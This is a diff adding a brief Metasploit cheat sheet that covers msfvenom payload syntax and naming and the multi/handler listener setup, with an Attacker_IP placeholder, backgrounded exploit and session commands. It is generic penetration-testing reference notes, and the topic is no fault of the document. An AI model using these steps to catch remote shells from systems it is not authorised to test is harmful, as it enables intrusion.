@@ -1,0 +1,30 @@
+MSFVENOM : 
+
+    SYNTAX : msfvenom -p Payload_Name -Options
+
+    NAME_FORMAT : OS_Name/Architecture/Payload_Name
+
+    MANUAL : man msfconsole
+
+    LIST ALL AVAILABLE PAYLOADS : msfvenom --list payloads
+
+
+MULTI/HANDLER :
+
+    OPEN METASPLOIT : msfconsole
+
+    USE : use multi/handler
+
+    SEE OPTIONS TO SET : show options
+
+        set payload Payload_Name
+        set lhost Attacker_IP
+        set lport Port_Num
+
+    RUN EXPLOIT IN BACKGROUND : exploit -j
+
+    FOREGROUND SESSION : sessions ID
+
+    LIST SESSIONS ACTIVE : sessions
+
+    
